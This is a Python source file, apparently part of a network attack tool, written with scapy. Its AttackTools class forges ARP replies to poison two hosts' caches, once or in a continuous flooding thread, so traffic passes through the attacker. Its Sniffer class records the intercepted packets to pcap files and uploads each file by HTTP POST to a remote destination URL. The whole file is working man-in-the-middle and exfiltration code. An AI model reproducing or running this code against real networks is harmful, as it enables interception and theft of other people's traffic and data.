import scapy.layers.l2
import scapy.layers.inet
from scapy.all import *
from DataStructures import *
from threading import Thread
import time
from collections import deque
from requests import post


class AttackTools:
    @staticmethod
    def build_arp_response(attacker: Host, target1: Host, target2: Host):
        # TODO: Add error detection
        ether_index = 0
        arp_index = 1

        arp = scapy.layers.l2.Ether() / scapy.layers.l2.ARP()
        arp[ether_index].src = attacker.get_hwaddr()
        arp[arp_index].hwsrc = attacker.get_hwaddr()
        arp[arp_index].psrc = target1.get_addr()
        arp[arp_index].hwdst = target2.get_hwaddr()
        arp[arp_index].pdst = target2.get_addr()

        return arp

    @staticmethod
    def poison(attacker: Host, target1: Host, target2: Host, bidirectional: bool, flood: bool):
        arp1 = AttackTools.build_arp_response(attacker, target1, target2)
        if not flood:
            sendp(arp1, verbose=False)

        if bidirectional:
            arp2 = AttackTools.build_arp_response(attacker, target2, target1)
            if not flood:
                sendp(arp2, verbose=False)

        if flood:
            poisoners = [ARPPoisoner(arp1)]
            poisoners[0].poison()

        if flood and bidirectional:
            poisoners.append(ARPPoisoner(arp2))
            poisoners[1].poison()

        if flood:
            return poisoners

    @staticmethod
    def sniff(must_send: bool, interface: Interface, destination: Destination = None):
        sniffer = Sniffer(must_send, interface, destination)
        sniffer.begin_sniff()
        return sniffer


class ARPPoisoner:
    def __init__(self, pkt):
        self.thread = threading.Thread
        self.killed = False
        self.pkt = pkt

    def poison(self):
        self.thread = Thread(target=self.sendp_flood, args=(self.pkt,))
        self.thread.start()

    def kill(self):
        self.killed = True

    def get_thread(self):
        return self.thread

    def sendp_flood(self, pkt):
        while True:
            sendp(pkt, verbose=False)
            if self.killed:
                break


class Sniffer:
    def __init__(self, must_send: bool, interface: Interface, destination: Destination = None):
        self.thread = Thread
        self.killed = False
        self.must_send = must_send
        self.to_send = deque([])
        self.interface = interface
        self.destination = destination

    def kill(self):
        self.killed = True
        pkt = scapy.layers.inet.IP()
        pkt.dst = self.interface.get_active_hosts()[0].get_addr()
        # The sniff function will only terminate once it receives a packet. So send a meaningless packet to self to
        # ensure it terminates immediately.
        send(pkt, iface=self.interface.get_name(), verbose=False)

    def is_killed(self):
        return self.killed

    def get_next_to_send(self):
        return self.to_send.popleft()

    def get_to_send_que(self):
        return self.to_send

    def get_thread(self):
        return self.thread

    def begin_sniff(self):
        self.thread = Thread(target=self.continuous_sniff)
        self.thread.start()

    def sniff_single(self, file: str, filt: str = ""):
        if self.must_send:
            file_size_limit = 1000
        else:
            file_size_limit = 0

        conf.iface = self.interface.get_name()

        sniff(prn=lambda x: wrpcap(file, x, append=True), count=file_size_limit, filter=filt,
              stop_filter=lambda x: self.is_killed())

    @staticmethod
    def gen_file_name():
        cur_time = time.localtime()
        result = "pcap_files/" + time.strftime("%Y_%m_%d_%H_%M_%S", cur_time) + ".pcap"
        return result

    def continuous_sniff(self):
        filt = ""

        if self.to_send:
            n = 0
            ip_list = self.destination.get_ip_list()

            for ip in ip_list:
                filt = filt + "ip.dst != "
                filt = filt + ip

                if n != len(ip_list) - 1:
                    filt = filt + " and "

                n = n + 1

        while not self.killed:
            filename = Sniffer.gen_file_name()
            self.to_send.append(filename)
            self.sniff_single(filename, filt)
            if self.must_send:
                self.send_pcap()

    def send_pcap(self):
        post(self.destination.get_url(), files={'file': open(self.get_next_to_send(), 'rb')})
